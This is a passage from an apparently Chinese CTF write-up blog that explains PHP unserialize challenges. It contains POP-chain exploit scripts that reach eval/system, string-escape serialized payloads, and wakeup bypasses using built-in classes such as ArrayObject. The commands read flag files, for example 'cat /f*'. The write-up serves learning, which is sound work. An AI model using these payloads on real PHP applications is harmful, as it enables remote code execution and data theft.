class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">rce</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">nothing</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;t;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">youwant</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rce</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">output</span>();<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">nothing</span>();<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">youwant</span>();<br><span class="hljs-variable">$e</span>-&gt;cmd=<span class="hljs-string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>;<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-variable">$e</span>;<br><span class="hljs-variable">$d</span>-&gt;b=&amp;<span class="hljs-variable">$d</span>-&gt;a;<br><span class="hljs-variable">$d</span>-&gt;t=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后为什么要进行一个base64编码呢 因为上面的</p><p> $this-&gt;ob=unserialize(base64_decode($this-&gt;basedata));</p><p>先来说一下后面的实现过程 </p><p>下面post传入一个值 然后给了pdata 这个pdata也就相当于上面的 $this-&gt;name=$str;</p><p>然后进行一个替换匹配到了hacker给替换成loveuu！这个联想到了字符串逃逸增加</p><p>最后进行一个反序列化 这里触发了上面的wakeup</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key===<span class="hljs-string">&quot;UUCTF&quot;</span>)&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;ob=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;basedata));<br>       &#125;<br>       <span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>对basedata的值进行一个base64解码并且反序列化</p><p>最下面的对传入的post的值进行一个序列化 这里的key和basedata都是空值 因为它接收的是上面的name的值 所以这里为了下一步wakeup里面的进行 进行了一个字符串逃逸</p><p>“;s:3:”key”;s:5:”UUCTF”;s:8:”basedata”;s:176:”Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJzeXN0ZW0oImNhdCBmbGFnLnBocCIpOyI7fX19”;s:2:”ob”;N;}   236个字符  需要236个hacker</p><h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><p>这一题的话考察了对字符串逃逸的理解以及变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>先来看一下整体的思路： 就是让file_get_contents去读取flag所在的路径</p><p>f接收了function的值 下面的extract函数会进行一个变量覆盖</p><p>如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] =<span class="hljs-string">&#x27;123&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;覆盖前：&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;覆盖后：&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558152.png" alt="image-20230703154953884"></p><p>先看看phpinfo里面有没有什么东西 发现有一个文件名   d0g3_f1ag.php</p><p>然后我们要利用file_get_contents  进行读取的话  需要满足$_GET[‘img_path为空 当它为空时 利用字符串逃逸将guest_img.png  这个名字变成</p><p> d0g3_f1ag.php的名字</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558666.png" alt="image-20230703155417260"></p><p>正常的是这个 </p><p>然后将AA换成flag或者其他字符的话就可以进行字符串逃逸</p><p>我们需要的是：<br>“;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}  就是将base64字符换一下 这个长度是不变的 更方便了</p><p>最终测试结果：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">_SESSION[flagphpimg]=;<span class="hljs-symbol">s:</span><span class="hljs-number">3</span><span class="hljs-symbol">:<span class="hljs-string">&quot;123&quot;</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA=</span>=<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ctfshow-愚人杯-easy-php"><a href="#ctfshow-愚人杯-easy-php" class="headerlink" title="ctfshow 愚人杯 easy_php"></a>ctfshow 愚人杯 easy_php</h1><p>这个是在php7.3下绕过wakeup的一个trick</p><p>这个的话是使用php的一些内置类进行绕过的。用C开头绕过wakeup</p><p>先来看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;ctfshow);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;1+1&gt;2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>思路就是绕过wakeup,下面这个正则匹配就是不能是Oa开头，所以数组绕过就不可以，然后有一种绕过wakeup的方法是在O或a的后面数字的前面加上一个+，但这只是低版本的绕过。</p><p>现在php是7.3版本，需要利用C绕过。</p><p>如果我们仅仅将O改成C的话是不解析的，因为这个C是一个类，不在是一个对象，我们没有对它进行一个serialize 就不能进行反序列化。</p><p>所以我们这个时候就要用到了内置类。</p><p>Arrayobject。</p><p>当然还有其他的也可以用，这里参考师傅的博客：<a href="https://boogipop.com/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd%20[easy_php]/">https://boogipop.com/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd%20[easy_php]/</a></p><p>可以用的类有：</p><ul><li><p>ArrayObject::unserialize</p></li><li><p>ArrayIterator::unserialize</p></li><li><p>RecursiveArrayIterator::unserialize</p></li><li><p>SplObjectStorage::unserialize</p><p>下面我们可以进行一个演示。</p><p>ArrayObiect:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();  <span class="hljs-comment">//这个b的话可以是其他字母，没有影响</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558694.png" alt="image-20230923113604625"></p></li></ul><p>ArrayIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558970.png" alt="image-20230923113657744"></p><p>RecursiveArrayIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">RecursiveArrayIterator</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151559200.png" alt="image-20230923113836148"></p><p>SplObjectStorage：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplObjectStorage</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151559198.png" alt="image-20230923114023257"></p><p>这里我是在本地进行执行的，phpstorm我不知道为什么执行完是O开头的。</p><h1 id="nss上面的一题："><a href="#nss上面的一题：" class="headerlink" title="nss上面的一题："></a>nss上面的一题：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popmart</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yuki</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$molly</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dimoo</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;yuki=<span class="hljs-string">&#x27;tell me where&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;molly=<span class="hljs-string">&#x27;dont_tell_you&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dimoo=<span class="hljs-string">&quot;you_can_guess&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$where_you_go</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;yuki=<span class="hljs-variable">$where_you_go</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;molly === <span class="hljs-variable language_">$this</span>-&gt;yuki)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$pucky</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wq&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pucky</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pucky</span>===<span class="hljs-string">&quot;二仙桥&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pucky</span>===<span class="hljs-string">&quot;二仙桥&quot;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;window.alert(&#x27;说说看，你要去哪？？&#x27;);&lt;/script&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$pucky</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>前面的还好，就是引用绕过，主要是后面的传值，自己不怎么会，这里记录一下。</p><p>好吧，看了wp之后才发现自己是笨比。</p><p>前面因为是变量覆盖，我们可以先让wq=二仙桥 进入第二个if判断中，然后下面就是在post中传入pucky=…..(经过序列化后的值 也就是我们构造后得出来的)</p><h1 id="shctf新生赛-sseerriiaalliizzee"><a href="#shctf新生赛-sseerriiaalliizzee" class="headerlink" title="shctf新生赛  sseerriiaalliizzee"></a>shctf新生赛  sseerriiaalliizzee</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$barking</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;barking = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;barking-&gt;<span class="hljs-title function_ invoke__">dosomething</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$part1</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$part2</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; part1 = <span class="hljs-variable">$part1</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; part2 = <span class="hljs-variable">$part2</span>;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$useless</span>   = <span class="hljs-string">&#x27;&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$useful</span>= <span class="hljs-variable">$useless</span>. <span class="hljs-variable language_">$this</span>-&gt;part2;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt; part1,<span class="hljs-variable">$useful</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./flag,php&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;barking for fun!&quot;</span>;<br>        <br>    &#125;<br>&#125;<br><br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$code</span>))&#123;<br>       <span class="hljs-keyword">echo</span> 